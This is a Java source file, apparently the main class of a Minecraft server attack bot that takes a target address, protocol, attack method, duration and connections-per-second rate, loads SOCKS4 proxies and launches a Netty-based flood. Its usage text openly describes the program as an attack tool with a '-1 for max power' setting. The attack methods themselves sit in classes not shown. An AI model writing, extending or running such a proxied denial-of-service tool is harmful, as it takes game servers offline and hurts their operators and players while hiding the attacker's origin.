package xyz.mcbot;

import java.io.File;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.URL;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.util.Random;
import xyz.mcbot.methods.Method;
import xyz.mcbot.minecraftutils.ServerAddress;


























public class Main
{
  public static String origIP;
  public static String srvRecord;
  public static InetAddress resolved;
  public static int port;
  public static int protcolID;
  public static int protocolLength;
  public static String methodID;
  public static Method method;
  public static int duration;
  public static int targetCPS;
  public static int nettyThreads;
  public static int loopThreads;
  public static String string;
  public static File proxyFile;
  public static ProxyLoader proxies;
  
  public Main() {}
  
  public static void main(String[] args)
    throws Throwable
  {
    if (args.length != 5) {
      System.err.println("[ERROR] Correct usage: java -jar " + new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getName() + " <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>");
      System.err.println(" ");
      System.err.println("<IP:PORT>       - IP and port of the server             | Examples: 36.90.48.40:25577 or mc.server.com");
      System.err.println("<PROTOCOL>      - Protocol version of the server        | Examples: 47 or 340");
      System.err.println("<METHOD>        - Which method should be used to attack | Examples: join or ping");
      System.err.println("<SECONDS>       - How long should the attack last       | Examples: 60 or 300");
      System.err.println("<TARGET CPS>     - How many connections per second       | Examples: 1000 or 50000 (-1 for max power)");
      System.err.println(" ");
      System.err.println("Exit...");
      return;
    }
    
    System.out.println("Fetching proxies...");
    
















    proxyFile = new File("proxies.txt");
    if (!proxyFile.exists()) {
      System.err.println("[ERROR] File proxies.txt not found");
      System.err.println(" ");
      System.err.println("File proxies.txt must contain list of Socks4 Proxies.");
      System.err.println(" ");
      System.err.println("Exit...");
      return;
    }
    
    proxies = new ProxyLoader(proxyFile);
    try
    {
      System.out.println("Resolving IP...");
      
      ServerAddress sa = ServerAddress.getAddrss(args[0]);
      srvRecord = sa.getIP();
      port = sa.getPort();
      resolved = InetAddress.getByName(srvRecord);
      

      System.out.println("Resolved IP: " + resolved.getHostAddress());
      
      origIP = args[0].split(":")[0];
      protcolID = Integer.parseInt(args[1]);
      methodID = args[2];
      duration = Integer.parseInt(args[3]);
      targetCPS = Integer.parseInt(args[4]) + (int)Math.ceil(Integer.parseInt(args[4]) / 100 * (50 + Integer.parseInt(args[4]) / 5000));
      
      nettyThreads = targetCPS == -1 ? 256 : (int)Math.ceil(6.4E-4D * targetCPS);
      loopThreads = targetCPS == -1 ? 3 : (int)Math.ceil(1.999960000799984E-5D * targetCPS);
      protocolLength = protcolID > 128 ? 3 : 2;
      
      Random r = new Random();
      for (int i = 1; i < 65536; i++) {
        string = String.valueOf(string) + String.valueOf((char)(r.nextInt(125) + 1));
      }
    }
    catch (Exception e)
    {
      e.printStackTrace();
      Thread.sleep(5000L);
      return;
    }
    
    Methods.setupMethods();
    method = Methods.getMethod(methodID);
    
    NettyBootstrap.start();
  }
}
